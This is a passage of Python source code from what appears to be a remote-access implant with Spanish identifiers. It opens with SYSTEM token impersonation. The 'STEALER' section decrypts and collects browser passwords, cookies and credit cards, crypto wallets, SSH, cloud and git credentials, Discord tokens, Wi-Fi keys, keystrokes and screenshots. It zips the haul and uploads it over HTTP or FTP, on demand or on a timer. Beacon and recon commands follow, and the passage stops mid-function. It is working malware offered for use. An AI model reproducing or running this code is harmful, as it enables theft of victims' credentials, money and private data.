        k = ctypes.windll.kernel32
        adv = ctypes.windll.advapi32
        pid = _pid_de("winlogon.exe")
        if not pid:
            return None
        hproc = k.OpenProcess(0x0400, False, pid)
        if not hproc:
            return None
        htok = wintypes.HANDLE()
        if not adv.OpenProcessToken(hproc, 0x0002 | 0x0008, ctypes.byref(htok)):
            k.CloseHandle(hproc)
            return None
        hdub = wintypes.HANDLE()
        ok = adv.DuplicateTokenEx(htok, 0x0002 | 0x0008 | 0x0001 | 0x0004,
                                  None, 2, 1, ctypes.byref(hdub))
        try:
            if not ok:
                return None
            adv.ImpersonateLoggedOnUser(hdub)
            try:
                return fn()
            finally:
                adv.RevertToUser()
        finally:
            for h in (htok, hdub, hproc):
                try:
                    k.CloseHandle(h)
                except Exception:
                    pass
    except Exception:
        return None


# ===========================================================================
#  STEALER
# ===========================================================================
DIR_STEAL = os.path.join(DIR_PERSIST, "stealer")
_STEAL = {"activo": False, "prog": 0, "fase": "idle", "error": None,
          "resumen": None, "zip": None, "auto": False, "url": "",
          "intervalo": 900, "ultimo": 0.0}


def _texto(b):
    if isinstance(b, str):
        return b
    try:
        return b.decode("utf-8", "replace")
    except Exception:
        return ""


def _escribir(ruta, texto):
    try:
        os.makedirs(os.path.dirname(ruta), exist_ok=True)
        modo = "wb" if isinstance(texto, (bytes, bytearray)) else "w"
        with open(ruta, modo, **({} if modo == "wb" else {"encoding": "utf-8"})) as f:
            f.write(texto)
    except Exception:
        pass


def _copia_temp(ruta):
    global _TEMP_STEAL
    if not os.path.isfile(ruta):
        return None
    if _TEMP_STEAL is None:
        _TEMP_STEAL = tempfile.mkdtemp(prefix="jaguar_st_")
    dst = os.path.join(_TEMP_STEAL, f"{abs(hash(ruta))}.db")
    try:
        shutil.copy2(ruta, dst)
        for suf in ("-wal", "-shm"):
            if os.path.isfile(ruta + suf):
                try:
                    shutil.copy2(ruta + suf, dst + suf)
                except Exception:
                    pass
        return dst
    except Exception:
        return None


def _sqlite(ruta, sql, args=()):
    copia = _copia_temp(ruta)
    if not copia:
        return []
    try:
        con = sqlite3.connect(copia, timeout=3)
        try:
            return con.execute(sql, args).fetchall()
        finally:
            con.close()
    except Exception:
        return []


def _limpiar_temp_steal():
    global _TEMP_STEAL
    if _TEMP_STEAL and os.path.isdir(_TEMP_STEAL):
        shutil.rmtree(_TEMP_STEAL, ignore_errors=True)
    _TEMP_STEAL = None


def _rutas_cromo():
    if ES_WIN:
        la = os.environ.get("LOCALAPPDATA", "")
        ra = os.environ.get("APPDATA", "")
        return [
            ("Chrome", os.path.join(la, r"Google\Chrome\User Data")),
            ("Edge", os.path.join(la, r"Microsoft\Edge\User Data")),
            ("Brave", os.path.join(la, r"BraveSoftware\Brave-Browser\User Data")),
            ("Opera", os.path.join(ra, r"Opera Software\Opera Stable")),
            ("Vivaldi", os.path.join(la, r"Vivaldi\User Data")),
            ("Chromium", os.path.join(la, r"Chromium\User Data")),
        ]
    cfg = os.path.join(_HOME, ".config")
    return [
        ("Chrome", os.path.join(cfg, "google-chrome")),
        ("Chrome Beta", os.path.join(cfg, "google-chrome-beta")),
        ("Chromium", os.path.join(cfg, "chromium")),
        ("Edge", os.path.join(cfg, "microsoft-edge")),
        ("Brave", os.path.join(cfg, "BraveSoftware", "Brave-Browser")),
        ("Vivaldi", os.path.join(cfg, "vivaldi")),
        ("Opera", os.path.join(cfg, "opera")),
    ]


def _perfiles_cromo(raiz):
    if os.path.isfile(os.path.join(raiz, "Local State")):
        return ["."]
    out = []
    try:
        for n in os.listdir(raiz):
            p = os.path.join(raiz, n)
            if os.path.isdir(p) and (n == "Default" or n.startswith("Profile ")
                                     or n in ("Guest Profile", "System Profile")):
                out.append(n)
    except Exception:
        pass
    return out or ["Default"]


def _clave_keyring():
    for cmd in (["secret-tool", "lookup", "application", "chrome"],
                ["secret-tool", "lookup", "application", "chromium"]):
        if _tiene(cmd[0]):
            try:
                r = subprocess.run(cmd, capture_output=True, timeout=8)
                if r.returncode == 0 and r.stdout:
                    return r.stdout
            except Exception:
                continue
    return None


def _cromo_clave(raiz):
    try:
        with open(os.path.join(raiz, "Local State"), encoding="utf-8") as f:
            j = json.load(f)
        blob = base64.b64decode(j["os_crypt"]["encrypted_key"])
        if ES_WIN:
            if blob[:5] == b"DPAPI":
                blob = blob[5:]
            return _dpapi(blob)
        if blob[:3] == b"v10":
            blob = blob[3:]
        kr = _clave_keyring()
        if kr:
            pt = _aes_cbc_descifrar(kr, b" " * 16, blob)
            if pt:
                return pt[:16]
        return None
    except Exception:
        return None


def _cromo_clave20(raiz):
    if not ES_WIN:
        return None
    try:
        with open(os.path.join(raiz, "Local State"), encoding="utf-8") as f:
            j = json.load(f)
        b64 = j["os_crypt"].get("app_bound_encrypted_key")
        if not b64:
            return None
        blob = base64.b64decode(b64)
        if blob[:4] == b"APPB":
            blob = blob[4:]
        interno = _como_system(lambda: _dpapi(blob))
        return _dpapi(interno) if interno else None
    except Exception:
        return None


def _descifrar_valor(blob, clave, clave20=None):
    if not blob:
        return b""
    if isinstance(blob, str):
        blob = blob.encode("latin-1", "ignore")
    try:
        if blob[:3] in (b"v10", b"v11"):
            if ES_WIN:
                return _aes_gcm_descifrar(clave, blob[3:15], blob[15:])
            k = clave or hashlib.pbkdf2_hmac("sha1", b"peanuts", b"saltysalt",
                                             1, dklen=16)
            return _aes_cbc_descifrar(k, b" " * 16, blob[3:])
        if blob[:3] == b"v20" and ES_WIN:
            pt = _aes_gcm_descifrar(clave20 or clave, blob[3:15], blob[15:])
            return pt[32:] if len(pt) > 32 else pt
    except Exception:
        pass
    try:
        return _dpapi(blob)
    except Exception:
        return b""


def _col_navegadores(base):
    salida = os.path.join(base, "Navegadores")
    cont = {"perfiles": 0, "passwords": 0, "cookies": 0, "autofill": 0,
            "tarjetas": 0, "historial": 0, "bookmarks": 0}
    for nav, raiz in _rutas_cromo():
        if not os.path.isdir(raiz):
            continue
        clave = _cromo_clave(raiz)
        clave20 = _cromo_clave20(raiz)
        for perfil in _perfiles_cromo(raiz):
            pdir = os.path.join(raiz, perfil)
            if not os.path.isdir(pdir):
                continue
            d = os.path.join(salida, nav, perfil.replace(".", "default"))
            cont["perfiles"] += 1

            filas = _sqlite(os.path.join(pdir, "Login Data"),
                            "SELECT origin_url, username_value, password_value "
                            "FROM logins")
            if filas:
                lineas = []
                for url, usr, pwd in filas:
                    p = _texto(_descifrar_valor(pwd, clave, clave20))
                    lineas.append(f"URL: {url}\nUsuario: {usr}\nPassword: {p}\n")
                    cont["passwords"] += 1
                _escribir(os.path.join(d, "passwords.txt"), "\n".join(lineas))

            filas = _sqlite(os.path.join(pdir, "Cookies"),
                            "SELECT host_key, name, encrypted_value FROM cookies")
            if filas:
                lineas = []
                for host, nombre, val in filas:
                    v = _texto(_descifrar_valor(val, clave, clave20))
                    lineas.append(f"{host}\t{nombre}\t{v}")
                    cont["cookies"] += 1
                _escribir(os.path.join(d, "cookies.txt"), "\n".join(lineas))

            filas = _sqlite(os.path.join(pdir, "Web Data"),
                            "SELECT name, value FROM autofill")
            if filas:
                _escribir(os.path.join(d, "autofill.txt"),
                          "\n".join(f"{n} = {v}" for n, v in filas))
                cont["autofill"] += len(filas)

            filas = _sqlite(os.path.join(pdir, "Web Data"),
                            "SELECT name_on_card, expiration_month, expiration_year,"
                            " card_number_encrypted FROM credit_cards")
            if filas:
                lineas = []
                for nom, mm, aa, num in filas:
                    n = _texto(_descifrar_valor(num, clave, clave20))
                    lineas.append(f"Titular: {nom}\nNumero: {n}\nCaduca: {mm}/{aa}\n")
                    cont["tarjetas"] += 1
                _escribir(os.path.join(d, "tarjetas.txt"), "\n".join(lineas))

            filas = _sqlite(os.path.join(pdir, "History"),
                            "SELECT url, title FROM urls ORDER BY last_visit_time "
                            "DESC LIMIT 300")
            if filas:
                _escribir(os.path.join(d, "historial.txt"),
                          "\n".join(f"{u}\t{t}" for u, t in filas))
                cont["historial"] += len(filas)

            bm = os.path.join(pdir, "Bookmarks")
            if os.path.isfile(bm):
                try:
                    shutil.copy2(bm, os.path.join(d, "bookmarks.json"))
                    cont["bookmarks"] += 1
                except Exception:
                    pass

    _ff = _col_firefox(base)
    for k in cont:
        cont[k] += _ff.get(k, 0)
    return cont


def _der_items(blob):
    try:
        if not blob:
            return []
        if blob[0] == 0x04 and len(blob) > 2:
            l = blob[1]
            blob = blob[2:2 + l]
        if blob[0] != 0x30:
            return []
        i = 1
        l = blob[i]
        i += 1
        if l & 0x80:
            n = l & 0x7F
            l = int.from_bytes(blob[i:i + n], "big")
            i += n
        fin = i + l
        items = []
        while i < fin and blob[i] == 0x04:
            i += 1
            l = blob[i]
            i += 1
            if l & 0x80:
                n = l & 0x7F
                l = int.from_bytes(blob[i:i + n], "big")
                i += n
            items.append(blob[i:i + l])
            i += l
        return items
    except Exception:
        return []


def _ff_clave(pdir):
    kdb = os.path.join(pdir, "key4.db")
    if not os.path.isfile(kdb):
        return None
    copia = _copia_temp(kdb)
    if not copia:
        return None
    try:
        con = sqlite3.connect(copia, timeout=3)
        try:
            g = con.execute("SELECT item1 FROM metaData WHERE id='2'").fetchone()
            a11 = con.execute("SELECT a11 FROM nssPrivate LIMIT 1").fetchone()
        finally:
            con.close()
        if not (g and a11):
            return None
        hp = hashlib.sha1(g[0] + b"").digest()
        items = _der_items(a11[0])
        if len(items) < 3:
            return None
        clave = hashlib.pbkdf2_hmac("sha256", hp, items[0], 1, 32)
        dec = _aes_cbc_descifrar(clave, items[1], items[2])
        if len(dec) < 4:
            return None
        n = int.from_bytes(dec[2:4], "big")
        if not (0 < n <= 32) or len(dec) < 4 + n:
            n = len(dec) - 4
        return dec[4:4 + n]
    except Exception:
        return None


def _col_firefox(base):
    cont = {"perfiles": 0, "passwords": 0, "cookies": 0, "historial": 0}
    if ES_WIN:
        raiz = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox",
                            "Profiles")
    else:
        raiz = os.path.join(_HOME, ".mozilla", "firefox")
    if not os.path.isdir(raiz):
        return cont
    for perfil in os.listdir(raiz):
        pdir = os.path.join(raiz, perfil)
        if not os.path.isdir(pdir):
            continue
        cont["perfiles"] += 1
        d = os.path.join(base, "Navegadores", "Firefox", perfil)
        clave = _ff_clave(pdir)
        logins = os.path.join(pdir, "logins.json")
        if clave and os.path.isfile(logins):
            try:
                with open(logins, encoding="utf-8") as f:
                    j = json.load(f)
                lineas = []
                for lg in j.get("logins", []):
                    enc = lg.get("encrypted")
                    if not enc:
                        continue
                    items = _der_items(base64.b64decode(enc))
                    if len(items) < 2:
                        continue
                    pwd = (_3des_cbc_descifrar(clave, items[-2], items[-1])
                           if len(clave) == 24
                           else _aes_cbc_descifrar(clave, items[-2], items[-1]))
                    lineas.append(f"URL: {lg.get('hostname')}\n"
                                  f"Usuario: {lg.get('usernameField', '')}\n"
                                  f"Password: {_texto(pwd)}\n")
                    cont["passwords"] += 1
                if lineas:
                    _escribir(os.path.join(d, "passwords.txt"), "\n".join(lineas))
            except Exception:
                pass
        for nom, sql, archivo in (("cookies.txt",
                                   "SELECT host, name, value FROM moz_cookies",
                                   "cookies.sqlite"),
                                  ("historial.txt",
                                   "SELECT url, title FROM moz_places LIMIT 300",
                                   "places.sqlite")):
            filas = _sqlite(os.path.join(pdir, archivo), sql)
            if filas:
                _escribir(os.path.join(d, nom),
                          "\n".join("\t".join(str(x) for x in fila) for fila in filas))
                cont["cookies" if "cookie" in nom else "historial"] += len(filas)
    return cont


_IDS_EXT = {
    "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
    "fhbohimaelbohpjbbldcngcnapndodjp": "Binance",
    "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
    "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
    "ibnejdfjmmkpcnlpebgbjaanbjbbbabb": "TronLink",
    "dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
    "mcohilncbfahbmgdjkbpemcciiolgcge": "OKX",
}


def _col_wallets(base):
    cont = {"extensiones": 0, "escritorio": 0}
    perfiles = []
    for _, raiz in _rutas_cromo():
        if os.path.isdir(raiz):
            for p in _perfiles_cromo(raiz):
                perfiles.append(os.path.join(raiz, p))
    for pdir in perfiles:
        ext = os.path.join(pdir, "Local Extension Settings")
        if not os.path.isdir(ext):
            continue
        for idext, nombre in _IDS_EXT.items():
            origen = os.path.join(ext, idext)
            if os.path.isdir(origen):
                destino = os.path.join(base, "Wallets", "extensiones", nombre)
                try:
                    shutil.copytree(origen, destino, dirs_exist_ok=True)
                    cont["extensiones"] += 1
                except Exception:
                    pass

    if ES_WIN:
        ra = os.environ.get("APPDATA", "")
        escritorio = {
            "Exodus": os.path.join(ra, r"Exodus\exodus.wallet"),
            "Electrum": os.path.join(ra, r"Electrum\wallets"),
            "Ethereum": os.path.join(ra, r"Ethereum\keystore"),
            "Atomic": os.path.join(ra, r"atomic\Local Storage\leveldb"),
            "Coinomi": os.path.join(ra, r"Coinomi\Coinomi\wallets"),
            "Monero": os.path.join(_HOME, "Monero", "wallets"),
        }
    else:
        escritorio = {
            "Electrum": os.path.join(_HOME, ".electrum", "wallets"),
            "Ethereum": os.path.join(_HOME, ".ethereum", "keystore"),
            "Bitcoin": os.path.join(_HOME, ".bitcoin", "wallets"),
            "Monero": os.path.join(_HOME, "Monero", "wallets"),
            "Atomic": os.path.join(_HOME, ".config", "atomic", "Local Storage",
                                   "leveldb"),
            "Exodus": os.path.join(_HOME, ".config", "Exodus", "exodus.wallet"),
        }
    for nombre, ruta in escritorio.items():
        if os.path.isdir(ruta):
            try:
                shutil.copytree(ruta, os.path.join(base, "Wallets", nombre),
                                dirs_exist_ok=True)
                cont["escritorio"] += 1
            except Exception:
                pass
    return cont


def _col_apps(base):
    cont = {"archivos": 0}
    ra = os.environ.get("APPDATA", "")
    up = _HOME

    if ES_WIN:
        pares = [
            ("FileZilla/recentservers.xml",
             os.path.join(ra, r"FileZilla\recentservers.xml")),
            ("FileZilla/sitemanager.xml",
             os.path.join(ra, r"FileZilla\sitemanager.xml")),
            ("WinSCP/WinSCP.ini", os.path.join(ra, "WinSCP.ini")),
            ("OpenVPN", os.path.join(ra, r"OpenVPN Connect\profiles")),
            ("WireGuard", os.path.join(up, "WireGuard")),
            ("SSH", os.path.join(up, ".ssh")),
            ("Git/gitconfig", os.path.join(up, ".gitconfig")),
            ("Git/credentials", os.path.join(up, ".git-credentials")),
            ("AWS/credentials", os.path.join(up, r".aws\credentials")),
            ("Docker/config.json", os.path.join(up, r".docker\config.json")),
            ("Slack", os.path.join(ra, "Slack")),
            ("Telegram/tdata", os.path.join(ra, r"Telegram Desktop\tdata")),
        ]
    else:
        pares = [
            ("SSH", os.path.join(up, ".ssh")),
            ("Git/gitconfig", os.path.join(up, ".gitconfig")),
            ("Git/credentials", os.path.join(up, ".git-credentials")),
            ("AWS/credentials", os.path.join(up, ".aws", "credentials")),
            ("Docker/config.json", os.path.join(up, ".docker", "config.json")),
            ("bash_history", os.path.join(up, ".bash_history")),
            ("zsh_history", os.path.join(up, ".zsh_history")),
            ("WireGuard", os.path.join(up, ".config", "wireguard")),
            ("OpenVPN", os.path.join(up, ".config", "openvpn")),
            ("FileZilla", os.path.join(up, ".config", "filezilla")),
            ("Remmina", os.path.join(up, ".local", "share", "remmina")),
            ("Slack", os.path.join(up, ".config", "Slack")),
            ("npmrc", os.path.join(up, ".npmrc")),
            ("netrc", os.path.join(up, ".netrc")),
            ("kube/config", os.path.join(up, ".kube", "config")),
        ]
    for nombre, ruta in pares:
        if os.path.isdir(ruta):
            try:
                shutil.copytree(ruta, os.path.join(base, "Apps", nombre),
                                dirs_exist_ok=True)
                cont["archivos"] += 1
            except Exception:
                pass
        elif os.path.isfile(ruta):
            try:
                with open(ruta, "rb") as f:
                    _escribir(os.path.join(base, "Apps", nombre), f.read())
                cont["archivos"] += 1
            except Exception:
                pass

    try:
        for nombre, ruta in (
                ("Discord", os.path.join(ra, r"discord\Local Storage\leveldb")
                 if ES_WIN else os.path.join(up, ".config", "discord",
                                             "Local Storage", "leveldb")),
                ("DiscordPTB", os.path.join(ra, r"discordptb\Local Storage\leveldb")
                 if ES_WIN else os.path.join(up, ".config", "discordptb",
                                             "Local Storage", "leveldb"))):
            if not os.path.isdir(ruta):
                continue
            tokens = set()
            for a in os.listdir(ruta):
                if not a.endswith((".ldb", ".log")):
                    continue
                try:
                    with open(os.path.join(ruta, a), "rb") as f:
                        crudo = f.read()
                    for m in re.findall(rb"[\w-]{24,}\.[\w-]{6}\.[\w-]{25,110}", crudo):
                        tokens.add(m.decode("latin-1", "ignore"))
                except Exception:
                    pass
            if tokens:
                _escribir(os.path.join(base, "Apps", f"{nombre}_token.txt"),
                          "\n".join(sorted(tokens)))
                cont["archivos"] += 1
    except Exception:
        pass

    if ES_WIN:
        try:
            for prog in (os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
                         os.environ.get("ProgramFiles", r"C:\Program Files")):
                cfg = os.path.join(prog, "Steam", "config")
                if os.path.isdir(cfg):
                    for a in ("loginusers.vdf", "config.vdf"):
                        p = os.path.join(cfg, a)
                        if os.path.isfile(p):
                            with open(p, "rb") as f:
                                _escribir(os.path.join(base, "Apps", "Steam", a),
                                          f.read())
                            cont["archivos"] += 1
                    break
        except Exception:
            pass
    else:
        for cfg in (os.path.join(_HOME, ".steam", "steam", "config"),
                    os.path.join(_HOME, ".local", "share", "Steam", "config")):
            if os.path.isdir(cfg):
                for a in ("loginusers.vdf", "config.vdf"):
                    p = os.path.join(cfg, a)
                    if os.path.isfile(p):
                        with open(p, "rb") as f:
                            _escribir(os.path.join(base, "Apps", "Steam", a), f.read())
                        cont["archivos"] += 1
                break
    return cont


def _col_wifi(base):
    cont = {"redes": 0}
    try:
        if ES_ANDROID:
            d = _tx_json("termux-wifi-connectioninfo")
            lineas = []
            if d:
                lineas.append(f"{d.get('ssid', '?')}\t"
                              f"{d.get('bssid', '')}\t{d.get('ip', '')}")
                cont["redes"] += 1
            ok, txt = _tx("termux-wifi-scaninfo", timeout=25)
            if txt:
                try:
                    for ap in json.loads(txt):
                        lineas.append(f"{ap.get('ssid', '?')}\t"
                                      f"{ap.get('bssid', '')}\t{ap.get('frequency', '')}")
                        cont["redes"] += 1
                except Exception:
                    lineas.append(txt[:500])
            if lineas:
                _escribir(os.path.join(base, "Sistema", "wifi.txt"), "\n".join(lineas))
        elif ES_WIN:
            r = subprocess.run(["netsh", "wlan", "show", "profiles"],
                               capture_output=True, text=True, **_sin_consola())
            nombres = []
            for ln in (r.stdout or "").splitlines():
                if ":" in ln and ("perfil" in ln.lower() or "profile" in ln.lower()):
                    nombres.append(ln.split(":", 1)[1].strip())
            lineas = []
            for nom in nombres:
                r2 = subprocess.run(["netsh", "wlan", "show", "profile",
                                     f"name={nom}", "key=clear"],
                                    capture_output=True, text=True, **_sin_consola())
                clave = ""
                for ln in (r2.stdout or "").splitlines():
                    if ":" in ln and ("clave" in ln.lower()
                                      or "key content" in ln.lower()):
                        clave = ln.split(":", 1)[1].strip()
                        break
                lineas.append(f"{nom}\t{clave}")
                cont["redes"] += 1
            if lineas:
                _escribir(os.path.join(base, "Sistema", "wifi.txt"), "\n".join(lineas))
        else:
            dirs = ["/etc/NetworkManager/system-connections",
                    os.path.join(_HOME, ".config", "NetworkManager",
                                 "system-connections")]
            lineas = []
            for d in dirs:
                if not os.path.isdir(d):
                    continue
                for archivo in os.listdir(d):
                    p = os.path.join(d, archivo)
                    try:
                        with open(p, encoding="utf-8", errors="replace") as f:
                            txt = f.read()
                        ssid = psk = ""
                        for ln in txt.splitlines():
                            if ln.startswith("ssid="):
                                ssid = ln.split("=", 1)[1].strip()
                            elif ln.startswith("psk="):
                                psk = ln.split("=", 1)[1].strip()
                        if ssid:
                            lineas.append(f"{ssid}\t{psk}")
                            cont["redes"] += 1
                    except Exception:
                        continue
            if not lineas and _tiene("nmcli"):
                r = subprocess.run(["nmcli", "-f", "NAME,PASSWORD", "dev", "wifi",
                                    "list"], capture_output=True, text=True, timeout=15)
                if r.stdout.strip():
                    lineas = r.stdout.strip().splitlines()
            if lineas:
                _escribir(os.path.join(base, "Sistema", "wifi.txt"), "\n".join(lineas))
    except Exception:
        pass
    return cont


def _col_sistema(base):
    cont = {"items": 0}
    try:
        info = _sysinfo()
        info["usuario_dominio"] = (f"{os.environ.get('USERDOMAIN', '')}\\{_usuario()}"
                                   if ES_WIN else _usuario())
        info["es_vm"] = _es_vm()
        _escribir(os.path.join(base, "Sistema", "info.txt"),
                  json.dumps(info, indent=2, ensure_ascii=False))
        cont["items"] += 1
    except Exception:
        pass
    try:
        _escribir(os.path.join(base, "Sistema", "entorno.txt"),
                  "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items())))
        cont["items"] += 1
    except Exception:
        pass
    try:
        cmd = ["tasklist"] if ES_WIN else (["ps", "-A"] if ES_ANDROID else ["ps", "aux"])
        r = subprocess.run(cmd, capture_output=True, text=True, **_sin_consola())
        _escribir(os.path.join(base, "Sistema", "procesos.txt"), r.stdout or "")
        cont["items"] += 1
    except Exception:
        pass
    if ES_ANDROID:
        for nombre, cmd in (("bateria.txt", "termux-battery-status"),
                            ("telefonia.txt", "termux-telephony-deviceinfo"),
                            ("apps.txt", "pm list packages -3"),
                            ("almacenamiento.txt", "df -h")):
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                   timeout=25)
                if r.stdout.strip():
                    _escribir(os.path.join(base, "Sistema", nombre), r.stdout)
                    cont["items"] += 1
            except Exception:
                continue
    elif not ES_WIN:
        for nombre, cmd in (("usuarios.txt", "cat /etc/passwd"),
                            ("sudoers.txt", "cat /etc/sudoers 2>/dev/null"),
                            ("servicios.txt", "systemctl list-units --type=service "
                                              "--state=running --no-pager"),
                            ("crontab.txt", "crontab -l 2>/dev/null"),
                            ("paquetes.txt", "dpkg -l 2>/dev/null || rpm -qa"),
                            ("red.txt", "ip -br addr; ip route")):
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                   timeout=25)
                if r.stdout.strip():
                    _escribir(os.path.join(base, "Sistema", nombre), r.stdout)
                    cont["items"] += 1
            except Exception:
                continue
    try:
        t = _clip_get({}).get("texto", "")
        if t:
            _escribir(os.path.join(base, "Sistema", "portapapeles.txt"), t)
            cont["items"] += 1
    except Exception:
        pass
    return cont


def _col_pantalla(base):
    try:
        datos = _captura({"formato": "jpeg", "calidad": 70, "escala": 1.0})
        if datos.get("b64"):
            _escribir(os.path.join(base, "Sistema", "pantalla.jpg"),
                      base64.b64decode(datos["b64"]))
            return {"pantalla": 1}
    except Exception:
        pass
    return {}


def _col_keylog(base):
    try:
        texto = "".join(_KLOG)
        if texto:
            _escribir(os.path.join(base, "teclas.txt"), texto)
            return {"teclas": len(texto)}
    except Exception:
        pass
    return {}


def _stealer_recolectar(a):
    if _STEAL["activo"]:
        return {"estado": "ya en curso", "fase": _STEAL["fase"]}
    op = {
        "navegadores": bool(a.get("navegadores", True)),
        "apps": bool(a.get("apps", True)),
        "wallets": bool(a.get("wallets", True)),
        "sistema": bool(a.get("sistema", True)),
        "wifi": bool(a.get("wifi", True)),
        "keylog": bool(a.get("keylog", True)),
        "screenshot": bool(a.get("screenshot", True)),
        "url": a.get("url", _STEAL["url"]),
    }
    _STEAL.update({"activo": True, "prog": 0, "fase": "iniciando", "error": None})
    threading.Thread(target=_stealer_trabajo, args=(op,), daemon=True).start()
    return {"estado": "iniciado"}


def _stealer_trabajo(op):
    res = {}
    try:
        sello = time.strftime("%Y%m%d_%H%M%S")
        base = os.path.join(DIR_STEAL, sello)
        os.makedirs(base, exist_ok=True)
        pasos = []
        if op["navegadores"]:
            pasos.append(("navegadores", _col_navegadores))
        if op["apps"]:
            pasos.append(("aplicaciones", _col_apps))
        if op["wallets"]:
            pasos.append(("wallets", _col_wallets))
        if op["sistema"]:
            pasos.append(("sistema", _col_sistema))
        if op["wifi"]:
            pasos.append(("wifi", _col_wifi))
        if op["keylog"]:
            pasos.append(("teclas", _col_keylog))
        if op["screenshot"]:
            pasos.append(("pantalla", _col_pantalla))
        total = max(1, len(pasos))
        for i, (nombre, fn) in enumerate(pasos):
            _STEAL["fase"] = nombre
            _STEAL["prog"] = int(i / total * 90)
            try:
                res[nombre] = fn(base) or {}
            except Exception as e:
                res[nombre] = {"error": str(e)}
        _STEAL["fase"] = "empaquetando"
        _STEAL["prog"] = 95
        _escribir(os.path.join(base, "resumen.json"), json.dumps(
            {"fecha": time.strftime("%Y-%m-%d %H:%M:%S"), "equipo": _sysinfo(),
             "res": res}, indent=2, ensure_ascii=False))
        zipruta = base + ".zip"
        with zipfile.ZipFile(zipruta, "w", zipfile.ZIP_DEFLATED) as z:
            for raiz, _, archivos in os.walk(base):
                for a in archivos:
                    p = os.path.join(raiz, a)
                    z.write(p, os.path.relpath(p, os.path.dirname(base)))
        tam = os.path.getsize(zipruta)
        _STEAL.update({"activo": False, "prog": 100, "fase": "listo",
                       "resumen": {"res": res, "ruta": base, "zip": zipruta,
                                   "tamano": tam},
                       "zip": zipruta, "ultimo": time.time()})
        _log("STEAL", f"paquete listo {zipruta} ({tam} bytes)")
        url = op.get("url") or _STEAL.get("url")
        if url:
            _stealer_exfil({"url": url})
    except Exception as e:
        _STEAL.update({"activo": False, "fase": "error", "error": str(e)})
        _log("STEAL", f"error: {e}")
    finally:
        _limpiar_temp_steal()


def _stealer_estado(a):
    return {"activo": _STEAL["activo"], "prog": _STEAL["prog"],
            "fase": _STEAL["fase"], "error": _STEAL["error"],
            "zip": _STEAL["zip"], "auto": _STEAL["auto"],
            "resumen": _STEAL["resumen"]}


def _stealer_paquete(a):
    ruta = _STEAL.get("zip")
    if not ruta or not os.path.isfile(ruta):
        return {"error": "no hay paquete; ejecuta stealer_recolectar"}
    with open(ruta, "rb") as f:
        d = f.read()
    return {"nombre": os.path.basename(ruta), "tamano": len(d),
            "b64": base64.b64encode(d).decode()}


def _http_subir(url, ruta):
    import urllib.request
    import uuid
    with open(ruta, "rb") as f:
        datos = f.read()
    lim = uuid.uuid4().hex
    nombre = os.path.basename(ruta)
    cuerpo = (f"--{lim}\r\nContent-Disposition: form-data; name=\"file\"; "
              f"filename=\"{nombre}\"\r\nContent-Type: application/zip\r\n\r\n"
              ).encode() + datos + f"\r\n--{lim}--\r\n".encode()
    req = urllib.request.Request(
        url, data=cuerpo, method="POST",
        headers={"Content-Type": f"multipart/form-data; boundary={lim}",
                 "User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=90) as r:
        return r.status


def _ftp_subir(host, usuario, clave, ruta, carpeta=""):
    import ftplib
    with ftplib.FTP(host, timeout=45) as f:
        f.login(usuario or "anonymous", clave or "")
        if carpeta:
            try:
                f.cwd(carpeta)
            except Exception:
                pass
        with open(ruta, "rb") as fh:
            f.storbinary("STOR " + os.path.basename(ruta), fh)
    return 226


def _stealer_exfil(a):
    ruta = a.get("ruta") or _STEAL.get("zip")
    if not ruta or not os.path.isfile(ruta):
        return {"error": "no hay paquete para exfiltrar"}
    tipo = (a.get("tipo") or ("ftp" if a.get("host") else "http")).lower()
    try:
        if tipo == "ftp":
            estado = _ftp_subir(a.get("host", ""), a.get("usuario", ""),
                                a.get("clave", ""), ruta, a.get("carpeta", ""))
        elif tipo == "ruta":
            destino = a.get("destino", "")
            os.makedirs(destino, exist_ok=True)
            shutil.copy2(ruta, os.path.join(destino, os.path.basename(ruta)))
            estado = "copiado"
        else:
            url = a.get("url") or _STEAL.get("url")
            if not url:
                return {"error": "falta url"}
            estado = _http_subir(url, ruta)
        _log("STEAL", f"exfiltrado ({tipo}) -> {estado}")
        return {"ok": True, "tipo": tipo, "estado": estado,
                "archivo": os.path.basename(ruta)}
    except Exception as e:
        _log("STEAL", f"exfil error: {e}")
        return {"error": str(e)}


def _stealer_auto(a):
    if "url" in a:
        _STEAL["url"] = a.get("url") or ""
    if "intervalo" in a:
        try:
            _STEAL["intervalo"] = max(60, int(a["intervalo"]))
        except Exception:
            pass
    on = bool(a.get("on"))
    if on and not _STEAL["auto"]:
        _STEAL["auto"] = True
        threading.Thread(target=_stealer_auto_loop, daemon=True).start()
    elif not on:
        _STEAL["auto"] = False
    return {"auto": _STEAL["auto"], "url": _STEAL["url"],
            "intervalo": _STEAL["intervalo"]}


def _stealer_auto_loop():
    while _STEAL["auto"]:
        try:
            if not _STEAL["activo"]:
                _stealer_recolectar({"url": _STEAL["url"]})
        except Exception:
            pass
        fin = time.time() + _STEAL["intervalo"]
        while _STEAL["auto"] and time.time() < fin:
            time.sleep(2)


# ===========================================================================
#  Recon / beacon
# ===========================================================================
def _hilo_latido(sock):
    while True:
        try:
            _enviar(sock, {"tipo": "latido", "ts": time.time(),
                           "sleep": SLEEP, "jitter": JITTER})
        except Exception:
            return
        time.sleep(max(1.0, SLEEP * (1 + random.uniform(-JITTER, JITTER))))


def _whoami(a):
    return {"salida": _cmd_out("whoami /all" if ES_WIN else "id; echo; groups")}


def _netstat(a):
    if ES_WIN:
        return {"salida": _cmd_out("netstat -ano")}
    return {"salida": _cmd_out("ss -tulpn 2>/dev/null || netstat -tulpn")}


def _arp(a):
    if ES_WIN:
        return {"salida": _cmd_out("arp -a")}
    return {"salida": _cmd_out("ip neigh 2>/dev/null; cat /proc/net/arp")}


def _ipconfig(a):
    if ES_WIN:
        return {"salida": _cmd_out("ipconfig /all")}
    if ES_ANDROID:
        return {"salida": _cmd_out("ip -br addr; ip route; getprop | grep -i net")}
    return {"salida": _cmd_out("ip -br addr; ip route")}


def _tasklist(a):
    return {"salida": _cmd_out("tasklist /v" if ES_WIN else "ps auxf")}


def _net_user(a):
    if ES_WIN:
